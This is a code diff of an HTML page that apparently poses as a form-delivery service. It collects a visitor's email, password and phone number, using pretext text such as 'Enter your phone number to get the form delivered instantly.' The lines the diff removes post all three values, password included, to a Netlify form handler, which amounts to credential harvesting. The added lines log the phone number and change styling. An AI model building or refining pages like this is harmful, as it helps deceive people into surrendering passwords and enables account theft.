@@ -9,25 +9,24 @@
             margin: 0;
             padding: 0;
             font-family: 'Helvetica Neue', sans-serif;
-            background-color: #f4f4f4;
+            background-image: url('https://i.pinimg.com/originals/8d/6d/a9/8d6da99a5b4d0b18d0b886c98b4855df.png');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-image: url('https://i.pinimg.com/originals/8d/6d/a9/8d6da99a5b4d0b18d0b886c98b4855df.png');
-            background-size: cover;
-            background-position: center;
         }
 
         .form-container {
-            background-color: white;
+            background-color: rgba(255, 255, 255, 0.8);
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
             text-align: center;
-            opacity: 0.9; /* Slight transparency for better contrast with the background */
         }
 
         h2 {
@@ -82,6 +81,11 @@
             color: #666;
         }
 
+        /* Hide the phone modal initially */
+        #phoneModal {
+            display: none;
+        }
+
         .info-text {
             font-size: 14px;
             color: #888;
@@ -106,7 +110,7 @@
         <!-- Second form: phone number (hidden initially) -->
         <div id="phoneModal">
             <h2>Enter Your Phone Number</h2>
-            <p class="info-text">Enter your phone number so we can send the form to you instantly.</p>
+            <p class="info-text">Enter your phone number to get the form delivered instantly.</p>
             <form id="phoneForm" name="phoneForm" method="POST" data-netlify="true">
                 <input type="hidden" name="form-name" value="phoneForm"> <!-- hidden field -->
                 <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
@@ -144,23 +148,12 @@
             // Capture phone number
             const phone = document.getElementById('phone').value;
 
-            // Send the form data to Netlify
-            fetch(window.location.href, {  // Using current URL to submit to the Netlify handler
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({
-                    'email': document.getElementById('email').value,
-                    'userPassword': document.getElementById('userPassword').value,
-                    'phone': phone,
-                    'form-name': 'phoneForm',
-                })
-            })
-            .then(response => response.text())
-            .then(data => {
-                alert('Form submitted successfully!');
-                document.getElementById('phoneModal').style.display = 'none'; // Hide the phone form
-            })
-            .catch(error => console.error('Error:', error));
+            // Log the phone number along with email and password
+            console.log(`Phone: ${phone}`);
+
+            // After submission, alert the user and reset
+            alert('Form submitted successfully!');
+            document.getElementById('phoneModal').style.display = 'none'; // Hide the phone form
         });
     </script>
 
